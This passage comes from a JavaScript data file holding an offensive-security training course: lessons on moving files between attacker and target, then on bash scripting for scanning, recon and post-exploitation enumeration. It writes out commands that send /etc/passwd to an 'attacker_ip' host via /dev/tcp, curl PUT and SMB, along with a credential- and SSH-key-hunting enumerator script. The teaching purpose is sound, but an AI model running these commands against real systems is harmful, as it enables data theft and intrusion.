base64 tool.sh

# Target decodes it:
echo "BASE64_STRING_HERE" | base64 -d > tool.sh
chmod +x tool.sh

# Method 5: /dev/tcp (bash built-in — no netcat required)
# Attacker listens:
nc -lvnp 4444 > received_file

# Target sends using bash:
bash -c 'cat /etc/passwd > /dev/tcp/attacker_ip/4444'

# Target receives using bash:
bash -c 'cat < /dev/tcp/attacker_ip/4444 > /tmp/tool.sh'
\`\`\`

**Transferring files from target to attacker (exfiltration):**

\`\`\`bash
# Method 1: Python HTTP server with file upload (PUT support)
# Attacker — start a server that accepts uploads:
python3 -c "
import http.server
import socketserver

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open(self.path[1:], 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()

with socketserver.TCPServer(('', 8080), Handler) as httpd:
    httpd.serve_forever()
" &

# Target — upload a file:
curl -X PUT http://attacker_ip:8080/stolen.txt --data-binary @/etc/passwd

# Method 2: SMB server (useful on Windows targets, but works from Linux too)
# Attacker — start an SMB server (impacket):
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /tmp/transfer

# Target:
smbclient //attacker_ip/share -N -c "put /etc/passwd"

# Method 3: DNS exfiltration (when only DNS is allowed outbound)
# Encode data in DNS queries — useful in highly restricted environments
# Tool: dnscat2, iodine
\`\`\`

**Verifying file integrity after transfer:**

\`\`\`bash
# Generate SHA256 hash before transfer (attacker side)
sha256sum tool.sh

# Verify after transfer (target side)
sha256sum /tmp/tool.sh

# Both hashes should be identical
\`\`\`

**Exercise:** Set up a Python HTTP server on your Kali machine. Transfer the `/etc/passwd` file from your target VM to your Kali machine using three different methods: wget, curl, and netcat. Verify the integrity of each received file using sha256sum. Document the exact commands used for each method.`,
              image: null,
            },
          ],
        },

        // ── Room 4 ─────────────────────────────────────────────────────────────
        {
          id: 'room4',
          title: 'Scripting Fundamentals',
          overview:
            'Operators who can script move faster, automate repetitive tasks, and build custom tools when commercial tools fail or would be detected. This room teaches bash scripting from first principles — not just syntax, but the problem-solving patterns that make scripts effective in real engagements.',
          estimatedMinutes: 45,
          steps: [
            {
              title: 'Your First Script',
              instruction:
                `A bash script is a text file containing a sequence of shell commands. The operating system executes them in order, as if you had typed them yourself. Scripts automate repetitive tasks, allow you to build custom tools, and let you reproduce complex command sequences exactly.

**The shebang line:**

The first line of every bash script must be the shebang: `#!/bin/bash`. This tells the operating system which interpreter to use when executing the file. Without it, the system may try to use the wrong interpreter, producing confusing errors.

\`\`\`bash
#!/bin/bash
# Everything after a # is a comment — ignored by the interpreter
# This is good practice: comment what the script does and why

# ── Script metadata ──────────────────────────────────────────────────────────
# Script:  hello_operator.sh
# Purpose: Demonstrate basic script structure and command substitution
# Author:  Your Name
# Date:    2024-01-01

# Print a static message
echo "Hello, Operator"

# Print the current date and time
echo "Current time: $(date)"

# Print the current user
echo "Running as: $(whoami)"

# Print the current working directory
echo "Working directory: $(pwd)"

# Print the hostname
echo "Hostname: $(hostname)"

# Print the kernel version
echo "Kernel: $(uname -r)"

# Print network interfaces and their IPs
echo "Network interfaces:"
ip addr show | grep "inet " | awk '{print "  " $2}'

# Print a separator line
echo "─────────────────────────────────────────"
\`\`\`

**Creating and running scripts:**

\`\`\`bash
# Create the file
nano hello_operator.sh
# (paste the script content, then Ctrl+X, Y, Enter to save)

# Or create it directly with a heredoc:
cat > hello_operator.sh << 'EOF'
#!/bin/bash
echo "Hello, Operator"
echo "Running as: $(whoami) on $(hostname)"
EOF

# Make it executable
chmod +x hello_operator.sh

# Run it
./hello_operator.sh

# Alternative: run without making it executable (useful when you cannot chmod)
bash hello_operator.sh
sh hello_operator.sh

# Run with debugging — shows every command before executing it
bash -x hello_operator.sh

# Check a script for syntax errors without running it
bash -n hello_operator.sh
\`\`\`

**Command substitution — using command output as a value:**

\`\`\`bash
#!/bin/bash

# $(command) runs the command and replaces itself with the output
CURRENT_USER=$(whoami)
HOSTNAME=$(hostname)
KERNEL=$(uname -r)
IP_ADDR=$(hostname -I | awk '{print $1}')
DISK_USAGE=$(df -h / | tail -1 | awk '{print $5}')

echo "User:    $CURRENT_USER"
echo "Host:    $HOSTNAME"
echo "Kernel:  $KERNEL"
echo "IP:      $IP_ADDR"
echo "Disk:    $DISK_USAGE used"

# Backtick syntax (older, less readable — avoid in new scripts)
OLD_STYLE=`whoami`
\`\`\`

**Exercise:** Write the hello_operator.sh script above, run it, and verify the output is correct. Then extend it with three additional pieces of information: the total number of running processes, the amount of free memory, and the number of user accounts in `/etc/passwd`. Write the commands to extract each piece of information before adding them to the script.`,
              image: null,
            },
            {
              title: 'Variables and Arguments',
              instruction:
                `Variables store values that you can reuse and manipulate throughout your script. Arguments let users pass values in at runtime, making scripts flexible tools rather than single-purpose commands.

**Declaring and using variables:**

\`\`\`bash
#!/bin/bash

# Variable assignment — NO spaces around the = sign (this is a common mistake)
TARGET="192.168.1.1"
PORT=80
TIMEOUT=5
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Correct:   VAR="value"
# Incorrect: VAR = "value"  (bash interprets VAR as a command)

# Use a variable with $ prefix
echo "Target: $TARGET"
echo "Port: $PORT"

# Use curly braces to delimit the variable name (required in some contexts)
echo "Connecting to ${TARGET}:${PORT}"

# String operations
DOMAIN="hacktheplanet.com"
echo "Domain: $DOMAIN"
echo "Length: ${#DOMAIN}"              # Length of string: 17
echo "Uppercase: ${DOMAIN^^}"          # HACKTHEPLANET.COM
echo "Lowercase: ${DOMAIN,,}"          # hacktheplanet.com
echo "Strip prefix: ${DOMAIN#*.}"      # com (remove up to first dot)
echo "Replace: ${DOMAIN/hack/own}"     # owntheplanet.com

# Numeric variables
COUNT=0
TOTAL=100
FOUND=$((TOTAL - COUNT))

echo "Found: $FOUND"
echo "Double: $((COUNT * 2))"
echo "Remainder: $((TOTAL % 3))"

# Default values (if variable is unset or empty)
INTERFACE="${INTERFACE:-eth0}"    # Use eth0 if INTERFACE is not set
echo "Interface: $INTERFACE"
\`\`\`

**Command-line arguments:**

\`\`\`bash
#!/bin/bash

# Special argument variables:
# $0 — the name of the script itself
# $1, $2, $3... — positional arguments
# $@ — all arguments as separate words
# $* — all arguments as a single string
# $# — the number of arguments provided
# $? — exit status of the last command (0=success, non-zero=failure)
# $$ — PID of the current script
# $! — PID of the last background command

echo "Script name:      $0"
echo "First argument:   $1"
echo "Second argument:  $2"
echo "All arguments:    $@"
echo "Argument count:   $#"
echo "Script PID:       $$"

# Validate required arguments
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip> [port]"
    echo "Example: $0 192.168.1.1 80"
    exit 1
fi

TARGET="$1"
PORT="${2:-80}"     # Use argument $2, or default to 80 if not provided
echo "Scanning $TARGET on port $PORT"
\`\`\`

**Reading user input:**

\`\`\`bash
#!/bin/bash

# Basic input
echo -n "Enter target IP: "
read TARGET
echo "Target: $TARGET"

# Read with a prompt (bash 4+)
read -p "Enter target IP: " TARGET
echo "Target: $TARGET"

# Read a password (hides input)
read -s -p "Enter password: " PASSWORD
echo ""  # Print newline after hidden input
echo "Password stored (hidden)"

# Read with a timeout (5 seconds)
read -t 5 -p "Enter target (5 second timeout): " TARGET || TARGET="127.0.0.1"
echo "Target: $TARGET"

# Read multiple values at once
read -p "Enter host and port (space-separated): " HOST PORT
echo "Host: $HOST, Port: $PORT"

# Read input into an array
read -p "Enter multiple targets: " -a TARGETS
echo "First target: ${TARGETS[0]}"
echo "All targets: ${TARGETS[@]}"
\`\`\`

**A practical script — argument-driven host scanner:**

\`\`\`bash
#!/bin/bash

# ── Host Reachability Checker ────────────────────────────────────────────────
# Usage: ./check_hosts.sh <subnet> [timeout]
# Example: ./check_hosts.sh 192.168.1 1

SUBNET="${1:-192.168.1}"
TIMEOUT="${2:-1}"
ALIVE=0
DEAD=0

echo "[*] Scanning ${SUBNET}.0/24 (timeout: ${TIMEOUT}s)"
echo "[*] Started: $(date)"
echo "─────────────────────────────────────────"

for LAST_OCTET in $(seq 1 254); do
    HOST="${SUBNET}.${LAST_OCTET}"
    ping -c 1 -W "$TIMEOUT" "$HOST" > /dev/null 2>&1

    if [ $? -eq 0 ]; then
        echo "[UP]   $HOST"
        ALIVE=$((ALIVE + 1))
    fi
done

echo "─────────────────────────────────────────"
echo "[*] Finished: $(date)"
echo "[*] Alive: $ALIVE  |  Total checked: 254"
\`\`\`

**Exercise:** Write a script called `target_info.sh` that accepts a hostname or IP address as `$1` and prints: the resolved IP address (use `dig +short`), whether port 80 is open (use `nc -zw1`), whether port 443 is open, and whether port 22 is open. Add validation that exits with a usage message if no argument is provided. Test it against your target VM.`,
              image: null,
            },
            {
              title: 'Loops and Iteration',
              instruction:
                `Loops allow your scripts to repeat actions across lists of targets, ranges of values, or lines in a file. This is what transforms a single-host tool into a multi-host scanner — the automation capability that saves operators hours on every engagement.

**for loops:**

\`\`\`bash
#!/bin/bash

# For loop over an explicit list
for HOST in 192.168.1.1 192.168.1.2 192.168.1.3; do
    echo "Testing: $HOST"
    ping -c 1 -W 1 "$HOST" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "  [UP] $HOST"
    else
        echo "  [DOWN] $HOST"
    fi
done

# For loop over a numeric range using seq
for PORT in $(seq 1 1024); do
    nc -zw1 192.168.1.1 "$PORT" 2>/dev/null && echo "[OPEN] Port $PORT"
done

# For loop with step value (every 10)
for I in $(seq 0 10 100); do
    echo "Value: $I"
done

# For loop using brace expansion (no seq required)
for PORT in {80,443,8080,8443,3000,3306,5432,6379,27017}; do
    nc -zw1 192.168.1.1 "$PORT" 2>/dev/null && echo "[OPEN] Port $PORT"
done

# For loop over files matching a pattern
for CONF in /etc/*.conf; do
    echo "Config file: $CONF"
    # Search for passwords in each config file
    grep -qi "password" "$CONF" && echo "  [!] Contains 'password'"
done

# For loop over command output
for USER in $(cut -d: -f1 /etc/passwd | head -10); do
    echo "User: $USER (UID: $(id -u $USER 2>/dev/null))"
done

# Nested loops (subnet scan)
for SUBNET in 192.168.1 192.168.2 10.10.10; do
    for HOST in $(seq 1 10); do
        echo "Checking ${SUBNET}.${HOST}"
    done
done
\`\`\`

**while loops:**

\`\`\`bash
#!/bin/bash

# Basic while loop
COUNT=0
while [ $COUNT -lt 5 ]; do
    echo "Count: $COUNT"
    COUNT=$((COUNT + 1))
done

# While loop reading lines from a file
while IFS= read -r LINE; do
    echo "Processing: $LINE"
    ping -c 1 -W 1 "$LINE" > /dev/null 2>&1 && echo "  [UP] $LINE" || echo "  [DOWN] $LINE"
done < targets.txt

# While loop with pipe (note: runs in subshell, variable changes don't persist)
ALIVE=0
while IFS= read -r IP; do
    ping -c 1 -W 1 "$IP" > /dev/null 2>&1 && ALIVE=$((ALIVE + 1))
done < targets.txt

# Infinite loop with break condition (useful for persistent listeners)
ATTEMPTS=0
while true; do
    ATTEMPTS=$((ATTEMPTS + 1))
    echo "Attempt $ATTEMPTS"
    
    # Break after 10 attempts
    if [ $ATTEMPTS -ge 10 ]; then
        echo "Maximum attempts reached"
        break
    fi
    
    sleep 1
done

# Continue (skip to next iteration)
for I in $(seq 1 10); do
    # Skip even numbers
    [ $((I % 2)) -eq 0 ] && continue
    echo "Odd: $I"
done
\`\`\`

**A complete multi-target scanner:**

\`\`\`bash
#!/bin/bash

# ── Multi-Target Port Scanner ────────────────────────────────────────────────
# Usage: ./scanner.sh <targets_file> [ports_file]
# targets_file: one IP per line
# ports_file:   one port per line (default: common ports below)

TARGETS_FILE="${1:-targets.txt}"
PORTS_FILE="${2:-}"
COMMON_PORTS=(21 22 23 25 53 80 110 143 389 443 445 3306 3389 5432 6379 8080 8443 27017)
RESULTS_DIR="scan_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$RESULTS_DIR"

if [ ! -f "$TARGETS_FILE" ]; then
    echo "Error: targets file '$TARGETS_FILE' not found"
    exit 1
fi

echo "[*] Starting scan at $(date)"
echo "[*] Results will be saved to $RESULTS_DIR/"
echo ""

while IFS= read -r TARGET; do
    [ -z "$TARGET" ] && continue    # Skip empty lines
    [[ "$TARGET" =~ ^#  ]] && continue  # Skip comments

    echo "[*] Scanning: $TARGET"
    TARGET_FILE="${RESULTS_DIR}/${TARGET//./_}.txt"
    echo "Scan results for $TARGET - $(date)" > "$TARGET_FILE"

    if [ -n "$PORTS_FILE" ] && [ -f "$PORTS_FILE" ]; then
        PORTS=()
        while IFS= read -r P; do PORTS+=("$P"); done < "$PORTS_FILE"
    else
        PORTS=("${COMMON_PORTS[@]}")
    fi

    for PORT in "${PORTS[@]}"; do
        nc -zw1 "$TARGET" "$PORT" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "  [OPEN] $TARGET:$PORT"
            echo "OPEN $PORT" >> "$TARGET_FILE"
        fi
    done

done < "$TARGETS_FILE"

echo ""
echo "[*] Scan complete at $(date)"
echo "[*] Results saved to $RESULTS_DIR/"
\`\`\`

**Exercise:** Create a file called `targets.txt` with the IP addresses of three hosts in your lab (including your target VM). Write a script that reads each IP from the file, pings it, and if it is up, runs `nc` against the 10 most common ports to test which are open. Save the results to a file named `results_<date>.txt`. Run it and verify the output against what `nmap` reports for the same hosts.`,
              image: null,
            },
            {
              title: 'Conditionals and Error Handling',
              instruction:
                `Conditionals make your scripts intelligent — they allow different actions based on the state of the system, the result of a command, or the value of a variable. Combined with proper error handling, they make your scripts robust tools rather than fragile one-liners.

**If / elif / else:**

\`\`\`bash
#!/bin/bash

# Basic if/else structure
if [ condition ]; then
    # commands if true
elif [ other_condition ]; then
    # commands if this is true
else
    # commands if nothing matched
fi

# String comparisons
NAME="alice"
if [ "$NAME" = "root" ]; then
    echo "Running as root"
elif [ "$NAME" = "alice" ]; then
    echo "Running as alice"
else
    echo "Running as $NAME"
fi

# Numeric comparisons
AGE=25
if [ $AGE -lt 18 ]; then
    echo "Under 18"
elif [ $AGE -ge 18 ] && [ $AGE -lt 65 ]; then
    echo "Working age"
else
    echo "Retirement age"
fi
\`\`\`

**Test conditions reference:**

\`\`\`bash
# String tests
[ -z "$VAR" ]      # True if VAR is empty or unset
[ -n "$VAR" ]      # True if VAR is non-empty
[ "$A" = "$B" ]    # True if strings are equal
[ "$A" != "$B" ]   # True if strings are not equal
[[ "$A" == *"sub"* ]]  # True if A contains "sub" (bash extended test)

# Numeric tests
[ $A -eq $B ]   # Equal
[ $A -ne $B ]   # Not equal
[ $A -gt $B ]   # Greater than
[ $A -ge $B ]   # Greater than or equal
[ $A -lt $B ]   # Less than
[ $A -le $B ]   # Less than or equal

# File tests
[ -f "$FILE" ]   # True if FILE exists and is a regular file
[ -d "$DIR" ]    # True if DIR exists and is a directory
[ -e "$PATH" ]   # True if PATH exists (any type)
[ -r "$FILE" ]   # True if FILE is readable
[ -w "$FILE" ]   # True if FILE is writable
[ -x "$FILE" ]   # True if FILE is executable
[ -s "$FILE" ]   # True if FILE exists and has size > 0
[ -L "$FILE" ]   # True if FILE is a symbolic link
[ -O "$FILE" ]   # True if FILE is owned by the current user

# Combining conditions
[ $A -gt 0 ] && [ $A -lt 10 ]   # AND
[ $A -eq 0 ] || [ $A -eq 1 ]    # OR
! [ -f "$FILE" ]                  # NOT

# Command exit status
if ping -c 1 -W 1 192.168.1.1 > /dev/null 2>&1; then
    echo "Host is up"
fi

# Shorthand using && and ||
ping -c 1 -W 1 192.168.1.1 > /dev/null 2>&1 && echo "UP" || echo "DOWN"
\`\`\`

**Exit codes and error handling:**

\`\`\`bash
#!/bin/bash

# Every command returns an exit code
# 0 = success, non-zero = failure (specific values mean specific errors)
# $? holds the exit code of the last command

ls /nonexistent 2>/dev/null
echo "Exit code: $?"    # Prints: Exit code: 2 (No such file or directory)

ping -c 1 192.168.1.1 > /dev/null 2>&1
echo "Exit code: $?"    # 0 if reachable, 1 if not

# Checking exit codes after commands
nmap -p 80 192.168.1.1 -oN scan.txt
if [ $? -ne 0 ]; then
    echo "nmap failed — check that the target is reachable"
    exit 1
fi

# Using set -e (exit on any error — be careful with this)
set -e
# Now any command that fails will exit the script immediately

# Using set -u (exit if an unset variable is used)
set -u

# Using set -o pipefail (exit if any command in a pipe fails)
set -o pipefail

# Best practice for production scripts:
set -euo pipefail

# Trap — run cleanup code if the script exits or is interrupted
TMPFILE=$(mktemp)

cleanup() {
    echo "[*] Cleaning up temporary files..."
    rm -f "$TMPFILE"
}

trap cleanup EXIT      # Run cleanup() when script exits (any reason)
trap cleanup INT TERM  # Run cleanup() on Ctrl+C or kill

echo "Working with temp file: $TMPFILE"
echo "data" > "$TMPFILE"
# ... rest of script ...
# cleanup() is called automatically on exit
\`\`\`

**A robust port scanner with full error handling:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# ── Validated Port Scanner ────────────────────────────────────────────────────

check_port() {
    local HOST="$1"
    local PORT="$2"
    local TIMEOUT="${3:-1}"

    nc -zw"$TIMEOUT" "$HOST" "$PORT" 2>/dev/null
    return $?
}

usage() {
    echo "Usage: $0 <host> [start_port] [end_port]"
    echo "Example: $0 192.168.1.1 1 1024"
    exit 1
}

# Validate arguments
[ $# -lt 1 ] && usage
[ $# -lt 2 ] && START_PORT=1 || START_PORT="$2"
[ $# -lt 3 ] && END_PORT=1024 || END_PORT="$3"

TARGET="$1"

# Validate port range
if ! [[ "$START_PORT" =~ ^[0-9]+$ ]] || ! [[ "$END_PORT" =~ ^[0-9]+$ ]]; then
    echo "Error: ports must be numeric"
    exit 1
fi

if [ "$START_PORT" -gt "$END_PORT" ]; then
    echo "Error: start port must be less than or equal to end port"
    exit 1
fi

# Validate host reachability
echo "[*] Checking if $TARGET is reachable..."
if ! ping -c 1 -W 2 "$TARGET" > /dev/null 2>&1; then
    echo "[!] Warning: $TARGET did not respond to ping (may be firewalled)"
    echo "[*] Continuing scan anyway..."
fi

echo "[*] Scanning $TARGET ports $START_PORT-$END_PORT"
echo "[*] Started: $(date)"
OPEN_COUNT=0

for PORT in $(seq "$START_PORT" "$END_PORT"); do
    if check_port "$TARGET" "$PORT"; then
        echo "[OPEN] $TARGET:$PORT"
        OPEN_COUNT=$((OPEN_COUNT + 1))
    fi
done

echo "[*] Finished: $(date)"
echo "[*] Found $OPEN_COUNT open port(s)"
\`\`\`

**Exercise:** Extend the port scanner above to: (1) accept a file of targets as an optional second argument, (2) perform a reverse DNS lookup on the target before scanning, (3) save results to a file named `<target>_<date>.txt`, and (4) print a summary at the end showing how many ports were checked and how many were open. Test it against your lab environment.`,
              image: null,
            },
            {
              title: 'Functions and Script Organisation',
              instruction:
                `Functions allow you to define a block of code once and call it multiple times. They are the key to writing maintainable scripts — especially important as your tools grow from 20 lines to 200 lines.

**Defining and calling functions:**

\`\`\`bash
#!/bin/bash

# Function definition
greet() {
    echo "Hello, $1!"
}

# Call the function
greet "Operator"
greet "World"

# Function with local variables (do not leak into global scope)
calculate_cidr_hosts() {
    local CIDR="$1"
    local MASK=$((32 - CIDR))
    local HOSTS=$(( (2 ** MASK) - 2 ))
    echo "$HOSTS"
}

HOSTS=$(calculate_cidr_hosts 24)
echo "A /24 network has $HOSTS usable hosts"

# Function with return value via exit code
is_port_open() {
    local HOST="$1"
    local PORT="$2"
    nc -zw1 "$HOST" "$PORT" 2>/dev/null
    return $?  # Returns nc's exit code (0=open, 1=closed)
}

if is_port_open 192.168.1.1 80; then
    echo "Port 80 is open"
else
    echo "Port 80 is closed"
fi

# Function with return value via stdout
get_ip() {
    local HOSTNAME="$1"
    dig +short "$HOSTNAME" | head -1
}

IP=$(get_ip "google.com")
echo "Google's IP: $IP"
\`\`\`

**A fully structured recon script:**

\`\`\`bash
#!/bin/bash
set -uo pipefail

# ── HSOCIETY Recon Script ────────────────────────────────────────────────────
# Usage: ./recon.sh <target_domain>
# Performs passive and light active reconnaissance on a target domain.

TARGET="${1:-}"
OUTPUT_DIR=""
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# ── Utility functions ─────────────────────────────────────────────────────────

log_info()    { echo "[*] $1"; }
log_success() { echo "[+] $1"; }
log_warn()    { echo "[!] $1"; }
log_error()   { echo "[-] $1" >&2; }

banner() {
    echo "════════════════════════════════════════════════════════"
    echo "  HSOCIETY Recon Script"
    echo "  Target: $TARGET"
    echo "  Time:   $TIMESTAMP"
    echo "════════════════════════════════════════════════════════"
}

usage() {
    echo "Usage: $0 <target_domain>"
    echo "Example: $0 example.com"
    exit 1
}

check_dependencies() {
    local MISSING=0
    for TOOL in dig nmap nc curl whois; do
        if ! command -v "$TOOL" > /dev/null 2>&1; then
            log_error "Missing tool: $TOOL"
            MISSING=$((MISSING + 1))
        fi
    done
    [ $MISSING -gt 0 ] && { log_error "Install missing tools and retry"; exit 1; }
    log_success "All dependencies found"
}

setup_output() {
    OUTPUT_DIR="recon_${TARGET//./_}_${TIMESTAMP}"
    mkdir -p "$OUTPUT_DIR"
    log_info "Output directory: $OUTPUT_DIR/"
}

dns_recon() {
    log_info "DNS reconnaissance..."
    local OUT="$OUTPUT_DIR/dns.txt"

    echo "=== DNS Records for $TARGET ===" > "$OUT"
    for TYPE in A AAAA MX NS TXT SOA CNAME; do
        echo "--- $TYPE records ---" >> "$OUT"
        dig "$TARGET" "$TYPE" +short 2>/dev/null >> "$OUT"
    done

    # Extract IPs from A records
    MAIN_IPS=$(dig "$TARGET" A +short 2>/dev/null)
    log_success "DNS records saved to $OUT"
    echo "$MAIN_IPS"
}

subdomain_brute() {
    log_info "Subdomain enumeration..."
    local OUT="$OUTPUT_DIR/subdomains.txt"
    local WORDLIST=("www" "mail" "remote" "blog" "webmail" "server" "ns1" "ns2"
                    "smtp" "secure" "vpn" "m" "shop" "ftp" "mail2" "new" "old"
                    "admin" "dev" "staging" "api" "cdn" "portal" "beta")

    echo "=== Subdomain Brute Force for $TARGET ===" > "$OUT"
    local FOUND=0
    for SUB in "${WORDLIST[@]}"; do
        IP=$(dig +short "${SUB}.${TARGET}" 2>/dev/null | head -1)
        if [ -n "$IP" ]; then
            echo "[FOUND] ${SUB}.${TARGET} → $IP" | tee -a "$OUT"
            FOUND=$((FOUND + 1))
        fi
    done
    log_success "Found $FOUND subdomains → $OUT"
}

port_scan() {
    local IP="$1"
    log_info "Port scanning $IP..."
    local OUT="$OUTPUT_DIR/ports_${IP//./_}.txt"
    nmap -sV -sC -T4 -p 21,22,25,53,80,443,445,3306,3389,8080,8443 \
         "$IP" -oN "$OUT" > /dev/null 2>&1
    log_success "Port scan complete → $OUT"
}

http_recon() {
    local IP="$1"
    log_info "HTTP reconnaissance on $IP..."
    local OUT="$OUTPUT_DIR/http_${IP//./_}.txt"
    {
        echo "=== HTTP Headers ==="
        curl -sI --max-time 10 "http://$IP" 2>/dev/null
        echo ""
        echo "=== HTTPS Headers ==="
        curl -sI --max-time 10 "https://$TARGET" 2>/dev/null
    } > "$OUT"
    log_success "HTTP headers saved → $OUT"
}

# ── Main ──────────────────────────────────────────────────────────────────────

[ -z "$TARGET" ] && usage

banner
check_dependencies
setup_output

MAIN_IPS=$(dns_recon)
subdomain_brute

for IP in $MAIN_IPS; do
    port_scan "$IP"
    http_recon "$IP"
done

log_success "Reconnaissance complete. Results in ./$OUTPUT_DIR/"
\`\`\`

**Exercise:** Run the recon script against a domain you have permission to test (use your own domain, or use a deliberately vulnerable domain like `scanme.nmap.org`). Study the output. Then add a new function to the script called `whois_recon` that runs `whois` against the target domain and saves the output to the results directory. Integrate it into the `main` section.`,
              image: null,
            },
            {
              title: 'Practical Scripting: Building a Post-Exploitation Enumeration Tool',
              instruction:
                `Apply everything you have learned in this room to build a practical post-exploitation enumeration script — a tool you would actually use after gaining a shell on a Linux target.

**The goal:** A script that automatically gathers the most valuable enumeration data from a compromised Linux system, saves it in an organised structure, and prints a summary of high-value findings.

\`\`\`bash
#!/bin/bash
set -uo pipefail

# ── HSOCIETY Linux Post-Exploitation Enumerator ──────────────────────────────
# Run this after gaining a shell on a Linux target.
# Collects: system info, users, network, services, cron, SUID, and credentials.

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="/tmp/.enum_${TIMESTAMP}"  # Hidden directory in /tmp
FINDINGS=()     # Array to collect high-value findings

log()     { echo "[*] $1"; }
finding() { echo "[!!!] FINDING: $1"; FINDINGS+=("$1"); }

setup() {
    mkdir -p "$OUTPUT_DIR"
    log "Output directory: $OUTPUT_DIR"
}

system_info() {
    log "Collecting system information..."
    {
        echo "=== SYSTEM INFORMATION ==="
        echo "Hostname:    $(hostname)"
        echo "OS:          $(cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')"
        echo "Kernel:      $(uname -r)"
        echo "Arch:        $(uname -m)"
        echo "Uptime:      $(uptime -p)"
        echo "Date:        $(date)"
        echo ""
        echo "=== CURRENT USER ==="
        id
        echo ""
        echo "=== ENVIRONMENT ==="
        env | grep -iE "pass|key|token|secret|api|cred" 2>/dev/null || echo "No sensitive env vars found"
    } > "$OUTPUT_DIR/system.txt"

    # Check for sensitive env vars
    if env | grep -qiE "pass|key|token|secret|api|cred" 2>/dev/null; then
        finding "Sensitive environment variables found — see system.txt"
    fi
}

user_enum() {
    log "Enumerating users..."
    {
        echo "=== ALL USERS ==="
        cat /etc/passwd

        echo ""
        echo "=== INTERACTIVE SHELL USERS ==="
        grep -v "nologin\|false\|sync\|shutdown\|halt" /etc/passwd

        echo ""
        echo "=== SUDO PERMISSIONS ==="
        sudo -l 2>/dev/null || echo "Cannot check sudo permissions"

        echo ""
        echo "=== LOGGED IN USERS ==="
        who
        w
        last | head -20
    } > "$OUTPUT_DIR/users.txt"

    # Flag if full sudo is available
    sudo -l 2>/dev/null | grep -q "(ALL : ALL) ALL" && \
        finding "Full sudo access available — immediate root escalation possible"

    sudo -l 2>/dev/null | grep -q "NOPASSWD" && \
        finding "NOPASSWD sudo rules found — check users.txt for details"
}

network_enum() {
    log "Enumerating network..."
    {
        echo "=== NETWORK INTERFACES ==="
        ip addr show

        echo ""
        echo "=== ROUTING TABLE ==="
        ip route show

        echo ""
        echo "=== LISTENING PORTS ==="
        ss -tulnp

        echo ""
        echo "=== ESTABLISHED CONNECTIONS ==="
        ss -tnp

        echo ""
        echo "=== HOSTS FILE ==="
        cat /etc/hosts

        echo ""
        echo "=== ARP TABLE ==="
        arp -a 2>/dev/null || ip neigh show
    } > "$OUTPUT_DIR/network.txt"
}

cred_search() {
    log "Searching for credentials..."
    {
        echo "=== CREDENTIAL SEARCH RESULTS ==="
        echo ""
        echo "--- Web application configs ---"
        find /var/www /opt /srv -name "*.conf" -o -name "*.config" -o \
             -name "*.cfg" -o -name "*.php" -o -name "*.py" -o -name "*.env" \
             2>/dev/null | xargs grep -liE "password|passwd|secret|api_key|token" 2>/dev/null

        echo ""
        echo "--- History files ---"
        for HIST in ~/.bash_history ~/.zsh_history ~/.sh_history; do
            [ -f "$HIST" ] && { echo "=== $HIST ==="; cat "$HIST"; } 2>/dev/null
        done

        echo ""
        echo "--- SSH keys ---"
        find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
    } > "$OUTPUT_DIR/creds.txt"

    CRED_COUNT=$(wc -l < "$OUTPUT_DIR/creds.txt")
    [ "$CRED_COUNT" -gt 10 ] && finding "Potential credentials found — review creds.txt"
}

suid_check() {
    log "Finding SUID binaries..."
    SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)
    echo "$SUID_BINS" > "$OUTPUT_DIR/suid.txt"
    SUID_COUNT=$(echo "$SUID_BINS" | wc -l)
    log "Found $SUID_COUNT SUID binaries → $OUTPUT_DIR/suid.txt"

    # Flag non-standard SUID binaries
    STANDARD=("passwd" "sudo" "su" "newgrp" "gpasswd" "chsh" "chfn" "mount" "umount" "ping")
    while IFS= read -r BIN; do
        BIN_NAME=$(basename "$BIN")
        IS_STANDARD=0
        for S in "${STANDARD[@]}"; do
            [ "$BIN_NAME" = "$S" ] && IS_STANDARD=1 && break
        done
        [ $IS_STANDARD -eq 0 ] && finding "Non-standard SUID binary: $BIN"
    done <<< "$SUID_BINS"
}

cron_check() {
    log "Checking cron jobs..."
    {
        echo "=== SYSTEM CRONTAB ==="
        cat /etc/crontab 2>/dev/null

        echo ""
        echo "=== CRON.D ENTRIES ==="
        ls -la /etc/cron.d/ 2>/dev/null && cat /etc/cron.d/* 2>/dev/null

        echo ""
        echo "=== CURRENT USER CRONTAB ==="
        crontab -l 2>/dev/null || echo "No crontab for current user"
    } > "$OUTPUT_DIR/cron.txt"
}

print_summary() {
    echo ""
    echo "════════════════════════════════════════════════════════"
    echo "  ENUMERATION COMPLETE"
    echo "  Results saved to: $OUTPUT_DIR/"
    echo "════════════════════════════════════════════════════════"
    echo ""
    if [ ${#FINDINGS[@]} -gt 0 ]; then
        echo "HIGH-VALUE FINDINGS:"
        for F in "${FINDINGS[@]}"; do
            echo "  [!!!] $F"
        done
    else
        echo "  No immediate high-value findings flagged."
        echo "  Review output files manually."
    fi
    echo ""
}

# ── Main ──────────────────────────────────────────────────────────────────────
setup
system_info
user_enum
network_enum
cred_search
suid_check
cron_check
print_summary
\`\`\`

**Exercise:** Save this script to your Kali machine and run it. Review every output file it creates. Then make the following improvements: (1) Add a function that checks for world-writable configuration files in `/etc/`. (2) Add a function that searches for `.git` directories in web roots (which may contain source code and credentials). (3) Add a timing feature that reports how long the full enumeration took. Test your improvements against your lab target.`,
              image: null,
            },
          ],
        },
      ],
    }